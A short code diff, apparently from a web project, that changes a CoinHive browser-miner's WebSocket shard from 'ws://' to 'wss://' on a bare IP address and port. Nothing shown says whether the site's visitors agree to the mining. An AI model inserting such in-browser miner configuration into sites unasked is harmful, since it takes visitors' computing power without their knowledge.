@@ -1,4 +1,4 @@
-CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://24.240.222.68:8892"]];
+CoinHive.CONFIG.WEBSOCKET_SHARDS = [["wss://24.240.222.68:8892"]];
 
 var miner = null;
 
